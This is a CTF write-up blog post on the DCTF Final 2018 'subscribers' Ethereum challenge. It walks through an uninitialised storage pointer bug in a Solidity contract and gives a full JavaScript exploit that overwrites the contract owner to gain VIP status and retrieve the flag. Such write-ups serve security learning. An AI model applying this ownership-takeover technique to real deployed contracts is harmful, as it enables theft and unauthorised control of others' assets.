---
title: "DCTF Final 2018 Writeup"
date: 2018-11-09T14:22:42+02:00
draft: false
tags: [
  "ctf",
  "cyber-security",
  "write-up"
]
description: My solves for DCTF Final 2018 challenges
---

# subscribers

## Intro

This is the first blockchain problem that I encountered in a CTF. Although I previously have some idea as to how blockchains work, I am still a complete beginner to ethereum contract programming.

Just like how the [Dog or Frog](https://tcode2k16.github.io/blog/posts/picoctf-2018-writeup/general-skills/#dog-or-frog) problem from PicoCTF 2018 is a great introduction for me to machine learning, I learned a lot about blockchains and ethereum contract programming during the 24hrs.

## The challenge

Two pieces of information are given to the players. First, the source code of the ethereum contract written in [solidity](https://solidity.readthedocs.io/en/v0.4.24/) is available for download:

```
pragma solidity ^0.4.19; 

contract DCTF18_Subscribers{
    event EnabledRegistration(address _from);
    event DisabledRegistration(address _from);
    event newSubscription(address _subscriber, uint _subscription);
    event subscriptionDeleted(uint _id, address _subscriber, uint _subscription);

    struct Subscriber{
        uint subscription; //0 - default Subscriber, 1 - VIP Subscriber
        address subscriber; // address of the new subscriber
    }

    uint private registration_open = 0;
    address private owner; //address of the owner
   
    Subscriber[] private subscribers; //list of subscribers

    constructor() public {
        owner = msg.sender; //owner of the smart contract
        registration_open = 1; //registrations are open by default
        emit EnabledRegistration(owner);
    }

    function subscribe(address subscriber, uint subscription) public {
        require(registration_open > 0);
        //only owner can subscribe VIPs
        if(subscription == 1) {
            require(msg.sender == owner);
        }

        //save new subscribers
        Subscriber s;
        s.subscription = subscription;
        s.subscriber = subscriber;

        subscribers.push(s);

        emit newSubscription(subscriber, subscription);
    }  

    function enableRegistration() public {
        require(msg.sender == owner && registration_open != 1);
        registration_open = 1;
        emit EnabledRegistration(owner);
    }

    function disableRegistration() public {
        require(msg.sender == owner && registration_open != 0);
        registration_open = 0;
        emit DisabledRegistration(owner);
    }

    function deleteRegistration(uint id) public {
        require(msg.sender == owner);
        
        address subscriber = subscribers[id].subscriber;
        uint subscription = subscribers[id].subscription;

        delete subscribers[id];
        emit subscriptionDeleted(id, subscriber, subscription);
    }

    function getSubscriber(uint id) public constant returns (address subscriber,uint subscription){
        subscriber = subscribers[id].subscriber;
        subscription = subscribers[id].subscription;
    }

    function isVIP(uint id) public constant returns (address subscriber, bool vip) {
        subscriber = subscribers[id].subscriber;
        vip = (subscribers[id].subscription == 1);
    }
}
```

Second, an API interface is provided for the players to interact with the blockchain:

```
POST /function with post data json encoded. Available methods: 
{
    "/get_balance": {
        "wallet": "address",
        "in_ether": "boolean"
    },
    "/new_cold_wallet": {
        "password": "string"
    },
    "/send_money": {
        "from": "address",
        "password": "string",
        "to": "address",
        "amount": "amount in wei"
    },
    "/call_contract": {
        "address": "contract_address",
        "abi": "json array",
        "from": "address",
        "password": "string",
        "func": "function to call",
        "params": "json array",
        "value": "msg.value",
        "type": "standard|call",
        "gas": "int",
        "gasPrice": "int"
    },
    "/get_flag": {
        "id": "numeric",
        "target": "victim_address_where_attacker_is_vip",
        "attacker": "attacker_address",
        "password": "attacker_password"
    },
    "/get_victim": {},
    "/": {}
}
```

## Getting started

A bit overwhelmed by the new information, I decided to start from the basics and learn the solidity programming language. After a bit of googling, I found this great article: [Learn Solidity in Y Minutes](https://learnxinyminutes.com/docs/solidity/). The article did a good job teaching me the fundamental ideas behind contract-oriented programming and how it differs from other programming paradigms.

Now being able to read some solidity, I decided to do something more hands on. I found this website called [Ethernaut](https://ethernaut.zeppelin.solutions/), a Web3/Solidity based wargame, a few weeks ago, and this CTF became the perfect time for me to try it out.

I went through the first few levels of the wargame learning about how to set up [MetaMask](https://metamask.io/) and make transactions in the ethereum testnet. Although this part turns out to be irrelevant to the CTF problem, I am still glad that I am able to learn it as it shows how ethereum is being used in the real world and reinforces my understanding about blockchains.

At this point, I am a lot more conformable with blockchains and ethereum contracts. Amazing how much you can learn in a day.

## Diving in

Now with our newly gained knowledge, it is time to dive into the CTF challenge.

The first piece of the puzzle would be to create a program that can interact with the API given and allow us to make transactions with the smart contract involved in this challenge.

I decided to go with javascript for writing this program because:

* One, I am quite fluent with the language which is important when you are trying to learn another brand new thing.
* Two, javascript is very friendly to json objects and the web standard which is a huge plus (I tried python first for this challenge but just can't get the python script to pass the `abi` object correctly).

I have written out small pieces of code that interacts with each piece of the API. Here are just a few that are important:

```javascript
// call the subscribe function
let r = await axios.post('http://142.93.103.129:3000/call_contract', {
  address: target,
  abi: [{"constant":true,"inputs":[{"name":"id","type":"uint256"}],"name":"getSubscriber","outputs":[{"name":"subscriber","type":"address"},{"name":"subscription","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"disableRegistration","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"subscriber","type":"address"},{"name":"subscription","type":"uint256"}],"name":"subscribe","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"id","type":"uint256"}],"name":"deleteRegistration","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"id","type":"uint256"}],"name":"isVIP","outputs":[{"name":"subscriber","type":"address"},{"name":"vip","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"enableRegistration","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_from","type":"address"}],"name":"EnabledRegistration","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_from","type":"address"}],"name":"DisabledRegistration","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_subscriber","type":"address"},{"indexed":false,"name":"_subscription","type":"uint256"}],"name":"newSubscription","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_id","type":"uint256"},{"indexed":false,"name":"_subscriber","type":"address"},{"indexed":false,"name":"_subscription","type":"uint256"}],"name":"subscriptionDeleted","type":"event"}],
  from: myaddr,
  password: mypass,
  func: 'subscribe',
  params: [myaddr, 0],
  value: 0,
  type: 'standard',
  gas: 2000000,
  gasPrice: 0,
});

// get the flag
r = await axios.post('http://142.93.103.129:3000/get_flag', {
  id: 1,
  target: target,
  attacker: myaddr,
  password: mypass,
});
```

One key point in the progress is to correctly compile the application binary interface (ABI) for the smart contract. You can think of ABI as the protocol that dictates how machines talk to each other, and because every smart contract is unique, each has its own ABI that is directly compiled from the solidity source code.

I used [solcjs](https://github.com/ethereum/solc-js) to compile the ABI because I am already using javascript for my program, but keep in mind that a web tool such as [Remix](https://remix.ethereum.org/) can do the job just as well.

## Deeper into the abyss

Now finally, we can start to look at the smart contract itself and find the vulnerability. I relayed heavily on this article: [Solidity Security: Comprehensive list of known attack vectors and common anti-patterns](https://blog.sigmaprime.io/solidity-security.html) as it is both up-to-date and easy to understand.

I patiently went through each and every one of the possible attack vectors and tried to spot them in the smart contract code provided.

Finally, my effort paid off as I found the vulnerability that I am looking for: [Uninitialised Storage Pointers](https://blog.sigmaprime.io/solidity-security.html#storage).

## Problem with the void

The article linked above does a great job explaining the vulnerability in detail, so read that if you want a deeper understanding and I would just briefly summarize how the bug works and how it relates to this CTF problem in specific.

The vulnerability lies within the `subscribe` function:

```
function subscribe(address subscriber, uint subscription) public {
  require(registration_open > 0);
  //only owner can subscribe VIPs
  if(subscription == 1) {
    require(msg.sender == owner);
  }

  //save new subscribers
  Subscriber s;
  s.subscription = subscription;
  s.subscriber = subscriber;

  subscribers.push(s);

  emit newSubscription(subscriber, subscription);
}  
```

To spot this vulnerability, you need to first know how variables are stored in the ethereum virtual machine. In the ethereum VM, there are two types of variables: `storage` and `memory` variables, where `storage` variables are persistent and `memory` variables are not. The two equates to `global` and `local` variables in other programming languages. If not explicitly declared, the variable type when be determined by the content of that variable. For example, `uint` will default to `memory` and a struct such as `Subscriber` will default to `storage`.

As you can see above, the Subscriber variable `s` is declared without an explicit type, and in this case, it defaulted to global scope as a `storage` variable. Furthermore, because there's no `Subscriber` initialized for this pointer, the variable `s` will just point to the top two items/slots in the global scope:

```
uint private registration_open = 0;
address private owner; //address of the owner
```

So by calling the `subscribe`, any user is able to overwrite the `registration_open` and `owner` variable.

Using this we can make ourselves the owner of the smart-contract and thereby, giving ourselves VIPs.

Here is going to be our action plan:

* call `subscribe` with the user address and `0` --> this will make our user the owner of the contract but it will also disable registration
* call `enableRegistration` to open up registration again --> we can call this function now as we are now the owner
* call `subscribe` again with the user address and `1` --> this will make our user the owner of the contract **and** a VIP member
* call `/get_flag` and profit :)

Following the same extract idea and using the code snippets that we wrote before, we can now complete the exploit:

```javascript
const axios = require('axios')

const abi = [{"constant":true,"inputs":[{"name":"id","type":"uint256"}],"name":"getSubscriber","outputs":[{"name":"subscriber","type":"address"},{"name":"subscription","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"disableRegistration","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"subscriber","type":"address"},{"name":"subscription","type":"uint256"}],"name":"subscribe","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"id","type":"uint256"}],"name":"deleteRegistration","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"id","type":"uint256"}],"name":"isVIP","outputs":[{"name":"subscriber","type":"address"},{"name":"vip","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"enableRegistration","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_from","type":"address"}],"name":"EnabledRegistration","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_from","type":"address"}],"name":"DisabledRegistration","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_subscriber","type":"address"},{"indexed":false,"name":"_subscription","type":"uint256"}],"name":"newSubscription","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_id","type":"uint256"},{"indexed":false,"name":"_subscriber","type":"address"},{"indexed":false,"name":"_subscription","type":"uint256"}],"name":"subscriptionDeleted","type":"event"}];
myaddr = '0x313Ce889A274161555803eCB7437F5316256F34a';
mypass = '1234567890';

target = '0x30dF4556Af0a2103475c92881d5E07B59cFa69cC';

(async () => {
  let r = await axios.post('http://142.93.103.129:3000/call_contract', {
    address: target,
    abi,
    from: myaddr,
    password: mypass,
    func: 'subscribe',
    params: [myaddr, 0],
    value: 0,
    type: 'standard',
    gas: 2000000,
    gasPrice: 0,
  });

  r = await axios.post('http://142.93.103.129:3000/call_contract', {
    address: target,
    abi,
    from: myaddr,
    password: mypass,
    func: 'enableRegistration',
    params: [],
    value: 0,
    type: 'standard',
    gas: 2000000,
    gasPrice: 0,
  });

  console.log(r.data);

  r = await axios.post('http://142.93.103.129:3000/call_contract', {
    address: target,
    abi,
    from: myaddr,
    password: mypass,
    func: 'subscribe',
    params: [myaddr, 1],
    value: 0,
    type: 'standard',
    gas: 2000000,
    gasPrice: 0,
  });

  r = await axios.post('http://142.93.103.129:3000/get_flag', {
    id: 1,
    target: target,
    attacker: myaddr,
    password: mypass,
  });

  console.log(r.data);
})();
```

flag: `DCTF{49fa9bf37efd8d4b2c4ad4ce8a60f8022945bf1f6334c76cd729f2e029cf178c}`

# Extra

Despite being our first international CTF, my team, [HATS Singapore](https://ctftime.org/team/58574), ended at No. 12 on the scoreboard out of 17 teams, and we were able to beat [dcua](https://defcon.org.ua/) :)


{{< figure src="/blog/2018/dctf-final-writeup/ranks.png" >}}